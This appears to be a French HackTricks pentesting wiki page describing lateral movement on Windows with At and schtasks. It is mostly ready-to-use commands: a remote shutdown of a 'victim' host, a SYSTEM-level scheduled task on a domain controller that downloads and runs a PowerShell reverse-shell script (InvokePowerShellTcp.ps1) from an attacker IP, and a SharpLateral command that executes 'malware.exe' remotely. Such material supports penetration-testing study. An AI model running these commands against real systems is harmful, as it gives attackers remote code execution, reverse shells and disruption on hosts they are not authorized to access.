# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Comment ça fonctionne

At permet de planifier des tâches sur des hôtes où vous connaissez le nom d'utilisateur/(mot de passe/Hash). Ainsi, vous pouvez l'utiliser pour exécuter des commandes sur d'autres hôtes et obtenir la sortie.
```
At \\victim 11:00:00PM shutdown -r
```
En utilisant schtasks, vous devez d'abord créer la tâche puis l'appeler :
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Vous pouvez également utiliser [SharpLateral](https://github.com/mertdas/SharpLateral) :
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Plus d'informations sur l'[**utilisation de schtasks avec des tickets argent ici**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
